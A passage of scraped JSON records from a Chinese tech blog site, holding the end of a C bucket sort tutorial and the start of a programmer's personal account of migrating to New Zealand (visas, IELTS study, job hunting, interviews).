class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-61\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-62\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-64\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BucketSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-65\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-66\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">CountingSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">          </span><span class=\"crayon-c\">// 利用计数排序确定各个桶的边界（分桶）</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bn</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 对每一个桶中的元素应用插入排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-69\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">         </span><span class=\"crayon-c\">// C[i]为i号桶第一个元素的位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// C[i+1]-1为i号桶最后一个元素的位置</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-71\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 对元素个数大于1的桶进行桶内插入排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-72\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">InsertionSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-74\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-75\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-76\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-77\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">29</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">49</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">37</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">21</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 针对桶排序设计的输入</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-79\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-80\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">BucketSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-81\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"桶排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-82\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-83\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-84\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-85\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-86\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-87\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-88\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0142 seconds] -->\r\n\n</div>\n<p>下图给出了对{ 29, 25, 3, 49, 9, 37, 21, 43 }进行桶排序的简单演示过程</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/68f888edc63c6933d77b5290172ef0f9.jpg\" alt=\"\"></p>\n<p>桶排序不是比较排序，不受到O(nlogn)下限的影响，它是鸽巢排序的一种归纳结果，当所要排序的数组值分散均匀的时候，桶排序拥有线性的时间复杂度。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113977\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113977votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113977\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,算法", "url": "http://blog.jobbole.com/113977/", "url_obj_id": "b56537dc0b776f7afb12d3ecdd87b33c"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/2338372c99834ed4bf20a3c9d84619a4.jpg"], "title": "大龄码农的新西兰移民之路", "create_date": "2018/05/17 ·", "praise_num": 1, "fav_num": 6, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/yanxiaodi/p/MoveToNewZealand.html\">yan_xiaodi（微信公众号：nzcoder ）</a>   </div><div id=\"cnblogs_post_body\">\n<p>最近一年没怎么发博客，确实在忙一件事情——移民新西兰。如今已顺利入职，新西兰绿卡正在申请过程中，终于有时间将最近一年的经历整理成文，也供有此想法的同学们参考。</p>\n<p>先说一下自己的基本情况，我之前算是体制内的员工，本科并非计算机专业，后来勉强拿了个计算机的第二学位，但一直对软件开发比较有兴趣，所以后面的工作也都是与开发相关的职位，主要是.NET平台。之前的经历就不细说了，工龄已有10+，算是大龄码农了。这篇文章会比较长，基本是我前段时间记的流水账，内容将涵盖新西兰移民基本情况、常用途径、以及很多人问我的新西兰IT公司面试的相关情况。之所以写这么啰嗦，是因为我最初对移民一点概念都没有，只能大海捞针般在网上搜索其他人的经历分享，每篇文字都仔细研读，恨不得每个字都能搞明白背后的含义，从最初的一无所知，到慢慢的了解什么是签证，什么是PR，前人不经意的一点分享，说不定正是后来者需要的答案。正所谓难者不会，会者不难，所以我也希望这些流水账，能够对后来者有所帮助。</p>\n<p><a href=\"#a\">缘起 </a></p>\n<p><a href=\"#b\">初试受挫 </a></p>\n<p><a href=\"#c\">移民途径 </a></p>\n<p><a href=\"#d\">雅思之路 </a></p>\n<p><a href=\"#e\">求职困境 </a></p>\n<p><a href=\"#f\">柳暗花明 </a></p>\n<p><a href=\"#g\">签证办理 </a></p>\n<p><a href=\"#h\">顺利登陆 </a></p>\n<p><a href=\"#i\">目前状态 </a></p>\n<h1><a name=\"a\"></a>缘起</h1>\n<p>2017年之前，其实都算过着得过且过的生活，作为码农，30来岁在体力上已经拼不过年轻人了，学习能力也不如以前。当然如果想混日子，也不是不行。只是面对着高昂的学区房，也是感觉到压力重重。</p>\n<p>机缘巧合之下，2017年3月初，我在朋友圈偶尔看到别人转发的一篇文章，介绍了LookSee Wellington计划。具体原文我已经忘了在哪个公众号看到的了，官网现在也已下线。文章中介绍了新西兰的美丽景色，提到了新西兰惠灵顿正在面向世界招收IT人才，提供100个名额，包机票包住宿，提供面试机会。作为土包子我从来没出过国，这个免费旅行机会看起来不错啊。于是跟家人讨论了下，说试试呗，反正不花钱。我有两个同事前两年已经移民过去了，也咨询了一下，说那边工作压力不大，环境也好，可以试试。再加之看了好些介绍新西兰的文章，感觉风景确实不错，空气质量好，绿色无污染，最重要的是可以让孩子脱离国内的应试教育，值得一试。</p>\n<h1><a name=\"b\"></a>初试受挫</h1>\n<p>LookSee Wellington的网站一直登陆不了，问转发的公众号也没人理我，但看起来应该不像是骗人的。我在网站下方找到了联系方式，发邮件问网站是否还会开放。然后FQ到Facebook上找到了惠灵顿的官方账户，发私信问这个事情。得到的结论是，这个事情是真的，但网站挂了……现在还在修复程序，开放时间另行通知。</p>\n<p>这个活动的结束日期是3月20日，眼看距离截止日期越来越近了，看来免费旅行没戏了啊。看了一些资料说新西兰求职都用seek.com。3月13日我在Seek上投了个简历试水，第二天就收到拒信了。15日又投了一个，第二天又是拒信。真是太打击人了。后来才知道很多雇主一看你没工作签证，直接就拒了。16日晚上回家的公车上收到了邮件，说LookSee Wellington会在24小时之内重新开放。</p>\n<p>果不其然，3月17日我刷了一下网站，竟然可以注册了！赶紧提交各种信息，但英文简历还是要仔细斟酌的。找英语好的朋友帮忙看了下语法什么的有没有错误，3月22日深夜终于提交了。因为重新开放注册，网站访问速度非常慢，估计访问量太高。3月30日收到邮件说资料审核通过了。当时正在出差，忙完工作回到酒店就准备录自我介绍的视频，但酒店网络太差了，最后没办法用4G做热点，才上传成功。视频只能录2分钟，录了十多遍，总觉得说的不够。一直忙活到半夜11点多，才成功提交。等了两周多，4月21日收到邮件还是被拒了。但也是意料之中，我上Twitter上搜了一下这个话题，大概全球有48000多 人注册，选出1000个人发布给雇主，再挑100个人。所以选不上太正常了。</p>\n<p>4月23日本地有个移民中介有说明会，就去了解了一下。他们给打了一下分，不是太理想，没有英语成绩，没有Offer，新西兰和澳大利亚分数都不够，他们就推荐加拿大，但是感觉那边很冷，所以就搁下了。而且他们收费也很贵，新西兰移民在打分够的情况下也要7万……我只能呵呵了。</p>\n<h1><a name=\"c\"></a>移民途径</h1>\n<p>这段时间通过各种网站、公众号了解了新西兰移民的基本情况。新西兰移民算是各国移民中操作较为简单的一种，而且最大的好处是有无条件的永居权，就是拿到绿卡转永居后，不用再蹲移民监了。像美国、加拿大、澳洲等都要求在一定的时期内住够多少天才能继续保持绿卡，而新西兰没有这个限制。关于新西兰移民的资料，推荐以下网站：</p>\n<ul>\n<li><a href=\"http://www.jack-liu.com\">http://www.jack-liu.com</a> Jack Liu的博客，很多人推荐的新西兰自助移民的网站，有大量详细的移民政策解读、成功案例等内容，非常值得一读。</li>\n<li><a href=\"https://www.immigration.govt.nz\">https://www.immigration.govt.nz</a> 新西兰移民局官网，详细列出了每种签证的申请条件，必须仔细研读。</li>\n<li>部分公众号，在微信公众号中搜搜新西兰之类的，一大堆。有个人的有中介的，可以参考。</li>\n</ul>\n<p>找工作：</p>\n<ul>\n<li><a href=\"https://www.seek.co.nz\">https://www.seek.co.nz</a> 澳大利亚和新西兰主要的求职网站</li>\n<li><a href=\"http://www.linkedin.com\" target=\"_blank\">LinkedIn</a> 强烈推荐，可以找到很多猎头</li>\n<li><a href=\"https://www.trademe.co.nz/\">https://www.trademe.co.nz/</a> 相当于新西兰的淘宝，什么东西都有，买房租房，二手家具二手车，也可以找工作</li>\n<li><a href=\"http://www.workhere.co.nz/\">http://www.workhere.co.nz/</a> 专门针对海外求职者</li>\n<li><a href=\"https://www.newkiwis.co.nz/\">https://www.newkiwis.co.nz/</a> 职位不多</li>\n<li><a href=\"https://neuvoo.co.nz/\" target=\"_blank\">https://neuvoo.co.nz/</a> 一个全球性的求职网站</li>\n<li><a href=\"https://www.workingin-newzealand.com\">https://www.workingin-newzealand.com</a></li>\n<li><a href=\"https://angel.co/\" target=\"_blank\">https://angel.co/</a> 主要是一些初创阶段的企业招聘</li>\n<li><a href=\"https://www.looksee.co.nz\">https://www.looksee.co.nz</a> 就是之前LookSee Wellington的继任者，前一段时间在招建筑方面的人才，但最近一直不太活跃，本来我以为已经没人维护了，不过前几天又收到他们的邮件邀请参加在线会议的，说明还活着</li>\n</ul>\n<p>新西兰移民途径主要有这么几种：</p>\n<ul>\n<li>投资移民：土豪的选择，此处略。</li>\n<li>难民：这个就不用想了吧……</li>\n<li>留学移民：先过去读个学位，毕业后可以获得开放工签，也就是拿着这个签证可以找工作，找到工作后，打分应该就够160了。</li>\n<li>技术移民：最适合码农的方式，如果学历高，工作经验丰富，有可能海外直接就能打够160分。如果分数不够，那就得先找到工作，才能凑够160分。</li>\n<li>假期打工签证或银蕨签证：这是适合年轻人的方式，都是短期的，办了签证过去找工作，拿到Offer后基本上就能凑够160分了。但问题是这两种签证数量很少，要抢。而且假期打工签证限制申请人不能超过30岁 ，银蕨签证不能超过35岁。</li>\n<li>旅游签证：据说也有拿这个签证过去找工作的</li>\n<li>工作转居留：还有一些情况可以工作后转居留签，如认证雇主工签，认证雇主是移民局认可的一些大公司，如果能拿到这种工签，有效期有30个月，但限制只能为该雇主工作，工作满两年后可以转居留签证。</li>\n</ul>\n<p>所以我们一般说的移民都是指技术移民，申请要靠打分。根据申请人的年龄、工作经验、是否有Offer等几种因素，目前打够160分就可以入选进入后面的流程。但能不能批下来还是要看移民官了。打分可在此页面计算：</p>\n<p><a href=\"https://www.immigration.govt.nz/new-zealand-visas/apply-for-a-visa/tools-and-information/tools/points-indicator-smc-28aug\">https://www.immigration.govt.nz/new-zealand-visas/apply-for-a-visa/tools-and-information/tools/points-indicator-smc-28aug</a></p>\n<p>这个页面是目前最新的，有可能会根据政策变化。可以看出，对于国内本科学历，30岁左右的普通码农来说，没有新西兰的Offer，很难凑够160分，打分应该在140-150之间。所以要么去留学，要么就试试海外找工作。或者抢到假期打工签证或银蕨签证过去找 工作。同时，还必须满足英语成绩，即雅思6.5（也可以接受其他同等英语成绩）的要求。一旦拿到Offer，直接加50分，基本就够了。</p>\n<p>关于这160分，Jack的博客有很多解读，这里就不细说了。关键是作为普通码农，如何拿到50分的Offer加分？在刚开始的时候，我很傻很天真的以为，我申请办个工签过去找工作不行吗？原来没有Offer，是办不了工签的（除非是留学后的开放工签和配偶工签等），而没有工签，就没有在新西兰合法工作的权利，很多雇主不考虑，所以这是一个deadlock！接下来就给大家聊聊我是如何拿到Offer，凑到这关键的50分。</p>\n<h1><a name=\"d\"></a>雅思之路</h1>\n<p>无论其他条件如何，英语成绩是一定要的。对于移民新西兰来说，考个雅思总分6.5就够了，没有小分要求，A类G类都可。选哪个看自身条件，一般来说只是题型不一样，A类是学术类，小作文写图表，阅读内容较难，G类小作文是写书信，阅读内容稍简单，但得高分不容易。比如阅读同样错三四个，可能A类能得8分，G类只能得7分了，只是打个比方，不是说错3个就能得8分啊，千万别误会。其他题型都一样的。所以根据个人情况准备即可。对于澳洲移民，是需要听说读写四个6才可以。</p>\n<p>4月24日我注册了雅思考试，6月3日考，还有一个多月。此时的考虑是，2017年度的银蕨签证11月再次开放申请，我还有两次机会（35岁以上就不能申请了），应该可以试试。而且到11月还有半年时间，正好可以集中力量考雅思。报名后就每天用业余时间学英语，之所以没报班，也是想看看自己英语水平到底怎么样。这期间牺牲了很多陪孩子的时间，每天下班后都在办公室呆两三个小时，看看网上的公开课，背会单词。买了几本书，但到考试也没看完，有的连拆都没拆。帮助比较大的也就两三本，做了一套剑桥雅思11，听力感觉很差。阅读也不理想，写作根本都没有时间练，光背单词就占用了很多时间。一直到考前一周才开始抽时间写了几篇小作文。</p>\n<p>考雅思的过程就太戏剧化了。我一直认为考试日期是6月3日，而口语日期一直没有具体时间，只说可能在前后一周。网上说口语考试可以预定日期，我也没定，那一段时间老出差就疏忽了。后来5月27日这天是个周五，我还在上班，上午大概10点左右我鬼使神差的登录了一下雅思网站，没想到发现口语日期已经出来了，而且就在当天下午3点！我简直怀疑看错了，再次确定之后简直要疯掉了，赶紧请假，开车直奔考场。因为考场离市区很远，慌里慌张的到了考场，赶上了口语考试。因为准备也不是很充分，考官也比较严肃，感觉肯定要重考了。</p>\n<p>第二周是笔试，心态就放平了，反正考不过再考就是了。听力感觉很差，有几个题目很犹豫，其实写上就对了，但因为没把握到最后交卷也没填上。阅读是重点，我提前十分钟就做完了，又核对了一遍。作文就比较慌，因为没有正式练过，小作文拖的时间比较长，大概用了20分钟，大作文就很紧张了，一直写到最后一刻交卷。</p>\n<p>接下来两周因为感觉肯定要重考，所以纠结想再买点书，或者报个班。但一直犹豫犹豫，想拖到出分。两周后出分了，竟然达到了6.5，除了口语5分，其他几项都达到了6分，阅读竟然得了8。那一刻简直想大喊两声，一个多月没有白费，竟然一次考过。我感觉自己复习的方向还是比较对的，阅读是强项，一定要保证少出错。其他的就只能临时抱佛脚了。特别是写作，一定要找套路，怎么分段，怎么区分论点，考前我只写过一次大作文，几篇小作文，还是结构写对了才能到6。其实我词汇量并不是太好，也就是四五千的样子。</p>\n<p>推荐几个我用到的App：</p>\n<ul>\n<li>必应词典：这个在手机和PC都有相应的版本，微软出品</li>\n<li>百词斩：开始用这个背了一段时间单词</li>\n<li>扇贝系列：主要用扇贝阅读，连续打卡了二百多天，开始本来也想用扇贝单词的，但后来找到了另一个背单词的App，就不用了</li>\n<li>轻听：以前叫朗易思听，非常推荐这个App，里面有很多听力材料，可以调速度，把生词添加到生词本里，在不背单词里背。我听了一段时间BBC News，还有一些其他的乱七八糟的材料，各种层次的都有，现在主要用来给娃看小猪佩奇</li>\n<li>不背单词：就是朗易思听公司出的背单词App，我一般是这两个结合起来用。轻听里的生词加进来后，可以在不背单词里听包含这个单词的句子，情景性比较强</li>\n<li>小站雅思：考雅思比较好的App，不过G类内容比较少。主要用来练剑桥雅思以往的听力题。其他还有什么雅思哥之类的都可以试试</li>\n<li>英语流利说：这个App质量还是很高的，交互做的特别好，特别是里面的懂你英语，但我没毅力学完</li>\n</ul>\n<p>买书的话买了慎小嶷的几本，还有其他的一些，也没看完。主要是把剑桥雅思11听力阅读都做了一遍。</p>\n<p>总结来看，裸考雅思还是有一定的可能性的。主要是准备的方向要对，不一定非要报很贵的辅导班。实际上听了几个月BBC News之后，再听雅思听力感觉已经慢多了。</p>\n<h1><a name=\"e\"></a>求职困境</h1>\n<p>考过雅思后相对轻松一些，准备找工作。每过几天就会看看新西兰本地的几个招聘网站，但很多工作都是要求有PR（Permanent Resident Visa即永居签证，或称绿卡）或者工签的，海外能申请的并不多。我也试着申请过几个岗位，都是直接得到了拒信。所以也没有太大的进展。</p>\n<p>6月底我觉得这样等不是办法，要是人家都要本地的，那岂不是永远没有机会。我就在Seek上找了两家中介，直接发邮件给他们。6月22日我收到了一家中介的回复，让我做一个在线测试，但发来的是一个java的。我回复说我做.NET方向，他们又重新发了一个测试。我并没有急着做，过了几天有了充分的时间才开始做。题目都是一些基础的.NET常识，有部分拿不准的可以IDE里敲一下。</p>\n<p>过了几天他们换了一个人给我邮件，说我做的还不错，问我是否在中国、准备什么时间去新西兰之类的。我答复了，但几天后又没动静了。于是我还是主动出击，跟第一次联系的人再发邮件。这次有回音了，问我有没有申请银蕨签证，是否有时间skype聊一下。于是7月1日Skype聊了一下。第一次跟老外这么聊天，刚开始还很紧张，说完自我介绍就轻松点了，都是一些基本问题，大概十分钟左右。因为网络不太好老是卡，就约下次再聊。7月12日又聊了一次，换了个男的，问的问题差不多，就是了解一些情况之类的。中间我有几次没听明白他的问题，他说让我上youtube多听听新西兰的广播。我感觉沟通的还可以。聊完之后我继续在Skype上问下一步我该做什么，她说没什么可做的，他们会把我的资料提交给客户，有两家公司，暂时称为A和B，让我继续等消息。这期间我又联系了一个新西兰的朋友，他向我推荐了另一家中介，我发了LinkedIn站内信，也一直没有答复。</p>\n<p>一转眼又是一周，7月19日实在忍不住，在Skype上问了一下中介，也没答复我。但是7月20日上班路上就收到了一封邮件，是公司A发的，说拒绝了我的申请。哎真是很失望。没想到上班之后中介的Skype消息过来了，说还没有反馈，我说我已经收到了拒信了，她说没事，应该是系统错误，她会再确认一下，让我不用担心。真是峰回路转，一会就收到了中介的邮件，让我继续填一个表格，就是对自己各项技能的评价。我觉得不能太吹，各项技能满分是5分，我大部分写了3分或4分。很快填好发过去了。这期间感觉应该补充一下自己的基础知识，避免被问到一些基础问题时答不上来。于是重点看了C#的英文版文档，起码知道有些名词对应的英语是什么。</p>\n<h2>面试A</h2>\n<p>真是煎熬的周末，周一等了一天没动静，周二又忍不住发了个邮件问，终于答复了，说公司A安排周五面试，还是通过Skype进行，说要持续1.5小时。我的天，我从来没聊过这么久的英语，不知道能不能hold住。这几天就要好好看下专业资料了。新西兰时间是11点，国内这边是7点。时间太早，我想问问他们能不能调下时间，但中介说不好调，那就算了吧。</p>\n<p>周四晚上又重新把C#基础看了一遍，设计模式的书也在看。其实说不紧张，还是挺紧张的，毕竟工作了十多年，好久没有过面试经历了，都不知道要问什么。周五凌晨两点多就睡不着了，醒了看了看时间，然后就闭眼重新整理了一遍思路。迷迷糊糊又做了个梦，梦见自己正襟危坐准备面试，还穿着衬衫……忽然就醒了，才五点多，于是就起床洗漱准备电脑、网络，准备面试了。7点面试正式开始，先是打电话过来问能不能Skype，然后就开始视频聊天了。面试我的是两个人，年纪都不大，开始让我介绍了一些我的工作，问了我做过的一些项目的情况。然后就问C#的基础问题，还有SQL的一些内容，但SQL的问题我没听明白，没答上来，他就说算了，后面还包括了一些设计模式的问题。面试涵盖了以下内容：</p>\n<ul>\n<li>interface和abstract</li>\n<li>protect和internal</li>\n<li>async，await 